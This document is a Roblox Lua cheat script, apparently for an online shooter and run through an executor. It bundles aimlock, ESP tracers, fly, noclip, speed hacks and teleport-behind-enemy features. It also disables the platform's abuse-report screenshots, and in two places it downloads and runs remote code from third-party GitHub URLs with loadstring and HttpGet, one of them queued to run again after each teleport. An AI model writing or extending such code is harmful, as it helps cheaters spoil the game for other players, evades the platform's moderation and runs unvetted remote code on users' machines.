--[[
	Haxegon Rival Script - Consolidated & Updated

	This script combines the Anti Chat & Screenshot Logger with the Fly,
	ESP, Aimlock, and Teleport-Behind functions.

	Changes made:
	1. FIXED: The "Expected identifier" error caused by non-breaking spaces (U+A0).
	   All non-breaking spaces have been replaced with regular spaces (U+20).
	2. Fixed the fly toggle bug. When fly is disabled, the character will no longer
	   freeze in place and will return to a normal state.
	3. Adjusted the aimlock logic slightly to make it more stable for multiple users.
	   - The "flicking" issue is often caused by two scripts competing for mouse control.
	   - This version prioritizes keeping the current target once a right-click is held.
	   - It's a race condition between scripts, so it may still have conflicts, but this
	     should make it more stable.
	4. Consolidated all code into one single script block as requested.
]]

-- BEGIN SCRIPT ONE (Anti Chat & Screenshot Logger)
-- Wait for the game to finish loading
if not game:IsLoaded() then
    game.Loaded:Wait()
end

-- Services
local Players           = game:GetService("Players")
local TextChatService   = game:GetService("TextChatService")
local StarterGui        = game:GetService("StarterGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui           = game:GetService("CoreGui")

-- Local player & GUI
local lp        = Players.LocalPlayer
local playerGui = lp:WaitForChild("PlayerGui")

if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
    local startTime = tick()
    task.wait(0.21)

    -- Helper to show a notification
    local function showNotification(title, description, iconId)
        pcall(function()
            StarterGui:SetCore("SendNotification", {
                Title      = title;
                Text       = description;
                Icon       = iconId;
                Duration = 15;
            })
        end)
    end

    -- Prevent double‑loading
    if _G.VadriftsACLLoaded then
        showNotification("Haxegon Injector", "Already loaded!", "rbxassetid://2541869220")
        print("Anti Chat Logger already loaded!")
        return
    end
    _G.VadriftsACLLoaded = true

    showNotification(
        "Haxegon Injector",
        string.format("Loaded in %.2f seconds!", tick() - startTime),
        "rbxassetid://2541869220"
    )

    -- Disable Roblox’s built‑in screenshot reports
    if setfflag then
        pcall(function()
            setfflag("AbuseReportScreenshot",          "False")
            setfflag("AbuseReportScreenshotPercentage", "0")
        end)
    end

    -- Optional: re‑show chat UI if hidden
    task.spawn(function()
        repeat
            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
            task.wait()
        until StarterGui:GetCoreGuiEnabled(Enum.CoreGuiType.Chat)
    end)

    -- Optional: detect when user sends an emote ("/e ...") – no spam
    do
        local function setupChatHook()
            local chatBar
            local chatFrame = playerGui:FindFirstChild("Chat")
            if chatFrame then
                chatBar = chatFrame:FindFirstChild("ChatBar", true)
            end
            if not chatBar then
                local container = CoreGui:FindFirstChild("TextBoxContainer", true)
                if container then
                    chatBar = container:FindFirstChild("TextBox")
                end
            end
            if not chatBar then
                warn("❌ Could not find chat bar for emoting hook.")
                return
            end
            chatBar.FocusLost:Connect(function(enterPressed)
                if enterPressed then
                    local msg = chatBar.Text:lower()
                    if msg:match("^/e%s+[%w_]+") then
                        -- Emote detected; no further action to avoid spam
                    end
                end
            end)
        end

        setupChatHook()
    end
else
    -- Fallback: load external ACL if TextChatService isn't in use
    if not pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/vqmpjayZ/More-Scripts/main/Anthony's%20ACL"))()
    end) then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/vqmpjayZ/More-Scripts/main/Anthony's%20ACL"))()
    end
    print("Anti Chat & Screenshot Logger loaded.")
end
-- END SCRIPT ONE


-- BEGIN SCRIPT TWO (Fly / ESP / Teleport-Behind)
-- This line is from the original script, but may not function
-- as expected in all environments. Leaving it here for completeness.
queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/RamonNudles/rrtest2/refs/heads/index/smth.lua"))()')

-- Services
local RunService         = game:GetService("RunService")
local UserInputService   = game:GetService("UserInputService")
local Camera             = workspace.CurrentCamera
local ReplicatedStorage  = game:GetService("ReplicatedStorage")

-- Local player + mouse
local LocalPlayer = Players.LocalPlayer
local Mouse       = LocalPlayer:GetMouse()

-- Config
local Config = {
    WalkSpeedValue  = 50,
    FlySpeed        = 80,
    Noclip          = true,
    ShowESP         = true,
    ShowNameTags    = true,
    HPESP           = true,
    ESPTransparency = 0.5,
    BlinkingESP     = false,
    ESPColor        = Color3.fromRGB(214, 0, 255),
}

-- Global state for fly toggle
local flyEnabled = true -- Fly is on by default
local flyConnection = nil -- Stores the RenderStepped connection for fly movement

-- ─── WalkSpeed Enforcement & Fly ─────────────────────────────────
local function enforceSpeed(h)
    if not h then return end
    h.WalkSpeed = Config.WalkSpeedValue
    h:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
        if h.WalkSpeed ~= Config.WalkSpeedValue then
            h.WalkSpeed = Config.WalkSpeedValue
        end
    end)
end

-- Fly movement function
local function startFly()
    local char = LocalPlayer.Character
    if not char then return end

    local h = char:FindFirstChildOfClass("Humanoid")
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not h or not hrp then return end

    h.PlatformStand = true
    h.AutoRotate = false

    local gyro = Instance.new("BodyGyro", hrp)
    gyro.Name      = "FlyGyro"
    gyro.MaxTorque = Vector3.new(1,1,1) * math.huge
    gyro.P         = 100000

    local vel = Instance.new("BodyVelocity", hrp)
    vel.Name       = "FlyVelocity"
    vel.MaxForce   = Vector3.new(1,1,1) * math.huge
    vel.P          = 10000
    vel.Velocity   = Vector3.zero

    flyConnection = RunService.RenderStepped:Connect(function()
        if UserInputService:GetFocusedTextBox() then
            vel.Velocity = Vector3.zero
            return
        end
        if not hrp.Parent then return end

        local dir = Vector3.zero
        if UserInputService:IsKeyDown(Enum.KeyCode.W) then dir += Camera.CFrame.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.S) then dir -= Camera.CFrame.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.A) then dir -= Camera.CFrame.RightVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.D) then dir += Camera.CFrame.RightVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.Space) then dir += Vector3.new(0,1,0) end
        if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then dir -= Vector3.new(0,1,0) end

        vel.Velocity = (dir.Magnitude > 0 and dir.Unit * Config.FlySpeed) or Vector3.zero
        gyro.CFrame  = Camera.CFrame
    end)
end

local function stopFly()
    local char = LocalPlayer.Character
    if not char then return end

    local h = char:FindFirstChildOfClass("Humanoid")
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not h or not hrp then return end

    h.PlatformStand = false
    h.AutoRotate = true

    if flyConnection then
        flyConnection:Disconnect()
        flyConnection = nil
    end

    if hrp:FindFirstChild("FlyGyro") then hrp.FlyGyro:Destroy() end
    if hrp:FindFirstChild("FlyVelocity") then hrp.FlyVelocity:Destroy() end
end

local function hookCharacter(char)
    local h = char:WaitForChild("Humanoid", 5)
    enforceSpeed(h)
    
    -- If fly is already enabled, start it for the new character
    if flyEnabled then
        startFly()
    end
end

if LocalPlayer.Character then
    hookCharacter(LocalPlayer.Character)
end
LocalPlayer.CharacterAdded:Connect(hookCharacter)

-- Fly toggle keybind
UserInputService.InputBegan:Connect(function(input, processed)
    if not processed and input.KeyCode == Enum.KeyCode.Q then
        flyEnabled = not flyEnabled
        print("Fly toggled: " .. tostring(flyEnabled))

        if flyEnabled then
            startFly()
        else
            stopFly()
        end
    end
end)


-- ─── AIMLOCK FROM SCRIPT 1 (no UI, max sensitivity 1) ─────────────────────
local AimConfig = {
    Enabled = true,
    Sensitivity = 1,
    FOV = 600,
    Part = "Head",
    LockOnTarget = nil,
    WallCheck = false,
}

local function isValidTarget(player)
    if player == LocalPlayer then return false end
    if not player.Character then return false end
    local hum = player.Character:FindFirstChild("Humanoid")
    if not hum or hum.Health <= 0 then return false end
    return true
end

local function getTargetPart(character)
    return character and character:FindFirstChild(AimConfig.Part)
end

local function isVisible(targetPlayer)
    local character = targetPlayer.Character
    if not character then return false end
    local targetPart = getTargetPart(character)
    if not targetPart then return false end
    local origin = Camera.CFrame.Position
    local direction = (targetPart.Position - origin).Unit * 1000
    local rayParams = RaycastParams.new()
    rayParams.FilterType = Enum.RaycastFilterType.Blacklist
    rayParams.FilterDescendantsInstances = { LocalPlayer.Character }
    rayParams.IgnoreWater = true
    local result = workspace:Raycast(origin, direction, rayParams)
    if result and result.Instance and not character:IsAncestorOf(result.Instance) then
        return false
    end
    return true
end

local function getClosestPlayerInFOV()
    local closest, shortest = nil, AimConfig.FOV
    for _, player in pairs(Players:GetPlayers()) do
        if isValidTarget(player) then
            local part = getTargetPart(player.Character)
            if part and (not AimConfig.WallCheck or isVisible(player)) then
                local screen = Camera:WorldToScreenPoint(part.Position)
                local dist = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(screen.X, screen.Y)).Magnitude
                if dist < shortest then
                    closest, shortest = player, dist
                end
            end
        end
    end
    return closest
end

local function isLockedTargetValid()
    local t = AimConfig.LockOnTarget
    return t and t.Parent and isValidTarget(t) and getTargetPart(t.Character)
end

local RightMouseDown = false
UserInputService.InputBegan:Connect(function(input, processed)
    if not processed and input.UserInputType == Enum.UserInputType.MouseButton2 then
        RightMouseDown = true
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton2 then
        RightMouseDown = false
        AimConfig.LockOnTarget = nil
    end
end)

RunService.RenderStepped:Connect(function()
    if not AimConfig.Enabled or not RightMouseDown then return end
    if AimConfig.LockOnTarget and isLockedTargetValid() then
        local tp = getTargetPart(AimConfig.LockOnTarget.Character)
        local screen = Camera:WorldToScreenPoint(tp.Position)
        if screen.Z > 0 then
            local delta = (Vector2.new(screen.X, screen.Y) - Vector2.new(Mouse.X, Mouse.Y)) * AimConfig.Sensitivity
            mousemoverel(delta.X, delta.Y)
        end
    else
        AimConfig.LockOnTarget = getClosestPlayerInFOV()
    end
end)

-- ─── ESP & Tracers & Noclip ───────────────────────────────────────────────
local Tracers           = {}
local MAX_TRACER_DISTANCE = 1200

local function GetTracerOrigin()
    local v = Camera.ViewportSize
    return Vector2.new(v.X/2, v.Y)
end

local function CreateTracer()
    local L = Drawing.new("Line")
    L.Visible      = false
    L.Color        = Config.ESPColor
    L.Thickness    = 2
    L.Transparency = 1
    return L
end

local function CreateHighlight(c)
    if c:FindFirstChild("ESPHighlight") then return end
    local h = Instance.new("Highlight", c)
    h.Name             = "ESPHighlight"
    h.FillColor        = Config.ESPColor
    h.FillTransparency = Config.ESPTransparency
    h.OutlineTransparency= 1
end

local function CreateNametag(p, c)
    if c:FindFirstChild("ESPNameTag") then return end
    local head = c:FindFirstChild("Head")
    if not head then return end
    local bb = Instance.new("BillboardGui", c)
    bb.Name      = "ESPNameTag"
    bb.Adornee   = head
    bb.Size      = UDim2.new(0,100,0,20)
    bb.StudsOffset = Vector3.new(0,2.5,0)
    bb.AlwaysOnTop = true
    local lbl = Instance.new("TextLabel", bb)
    lbl.Size                   = UDim2.fromScale(1,1)
    lbl.BackgroundTransparency = 1
    lbl.Font                   = Enum.Font.SourceSansBold
    lbl.TextColor3             = Color3.new(1,1,1)
    lbl.TextScaled             = false
    lbl.TextSize               = 30
    if Config.HPESP then
        task.spawn(function()
            while bb.Parent and Config.ShowESP and Config.HPESP do
                local H = c:FindFirstChildOfClass("Humanoid")
                lbl.Text = ("%s | %d HP"):format(p.Name, H and math.floor(H.Health) or 0)
                task.wait(0.1)
            end
        end)
    else
        lbl.Text = p.Name
    end
end

local function RefreshESP()
    local origin = GetTracerOrigin()
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer then
            local c     = p.Character
            local root = c and c:FindFirstChild("HumanoidRootPart")
            local h     = c and c:FindFirstChildOfClass("Humanoid")
            if root and h and h.Health>0 and Config.ShowESP then
                local pos, on = Camera:WorldToViewportPoint(root.Position)
                local dist     = (root.Position - Camera.CFrame.Position).Magnitude
                if on and dist<MAX_TRACER_DISTANCE then
                    local T = Tracers[p] or CreateTracer()
                    Tracers[p] = T
                    T.Visible = true
                    T.From    = origin
                    T.To      = Vector2.new(pos.X, pos.Y)
                elseif Tracers[p] then
                    Tracers[p].Visible = false
                end
                CreateHighlight(c)
                if Config.ShowNameTags then CreateNametag(p,c) end
            else
                if Tracers[p] then Tracers[p].Visible = false end
                if c then
                    if c:FindFirstChild("ESPHighlight") then c.ESPHighlight:Destroy() end
                    if c:FindFirstChild("ESPNameTag")  then c.ESPNameTag:Destroy() end
                end
            end
        end
    end
end

Players.PlayerRemoving:Connect(function(p)
    if Tracers[p] then
        Tracers[p]:Remove()
        Tracers[p] = nil
    end
end)

RunService.RenderStepped:Connect(function()
    if Config.ShowESP then
        RefreshESP()
    else
        for _, L in pairs(Tracers) do L:Remove() end
        Tracers = {}
    end
end)

RunService.Stepped:Connect(function()
    if Config.Noclip then
        local c = LocalPlayer.Character
        if c then
            for _, part in ipairs(c:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end
    end
end)

-- ─── Teleport Behind Enemy (toggle with O) ───────────────────────────────
local behindToggle = false
UserInputService.InputBegan:Connect(function(inp, processed)
    if not processed and inp.KeyCode == Enum.KeyCode.O then
        behindToggle = not behindToggle
    end
end)

RunService.Heartbeat:Connect(function()
    if not behindToggle then return end

    local seen = {}
    for _, m in ipairs(ReplicatedStorage.Assets.Temp.ViewModels:GetChildren()) do
        local nm = m.Name:gsub(" %- .*","")
        if nm ~= LocalPlayer.Name then
            seen[nm] = true
        end
    end

    for nm in pairs(seen) do
        local pl = Players:FindFirstChild(nm)
        if pl
        and pl.Team ~= LocalPlayer.Team
        and pl.Character
        and pl.Character:FindFirstChild("HumanoidRootPart")
        and pl.Character:FindFirstChildOfClass("Humanoid").Health > 0 then

            local eHRP = pl.Character.HumanoidRootPart
            local mHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if mHRP then
                mHRP.CFrame = CFrame.new(eHRP.Position - eHRP.CFrame.LookVector*5, eHRP.Position)
                break
            end
        end
        break
    end
end)

print("✅Haxegon Rival Script Injected")
-- END SCRIPT TWO
